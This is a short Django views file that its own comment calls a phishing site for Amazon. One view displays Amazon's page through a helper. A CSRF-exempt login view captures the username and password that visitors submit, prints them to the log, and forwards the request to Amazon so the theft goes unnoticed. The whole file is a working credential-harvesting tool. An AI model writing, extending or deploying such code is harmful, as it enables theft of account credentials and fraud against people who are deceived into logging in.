from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt

from .helper import display_view, login_post

# Phishing site for Amazon
def index(request):
    url = 'https://www.amazon.com/'
    return display_view(url)

@csrf_exempt
def login(request):
    url = 'https://www.amazon.com/'
    data = {"username": request.POST.get("username"), "password": request.POST.get("password")}
    print("Data: ", data)
    return login_post(url, request.POST)